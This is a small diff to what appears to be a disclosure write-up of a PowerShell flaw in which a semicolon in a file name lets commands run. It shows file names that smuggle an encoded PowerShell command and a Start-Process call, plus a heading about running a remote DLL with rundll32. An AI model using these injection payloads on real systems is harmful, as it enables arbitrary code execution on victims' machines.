@@ -8,7 +8,8 @@ The flaw is due to semicolon ";" we can decode a Base64 command and execute stra
 
 Test;POweRsHeLL -e [BASE64 PAYLOAD];.ps1 <br>  
 
-OR just call commands straight away!
+OR just call commands straight away! <br>  
+
 Testing;saps (gc -) PoC.ps1
 
 1) Execute a remote DLL using rundll32
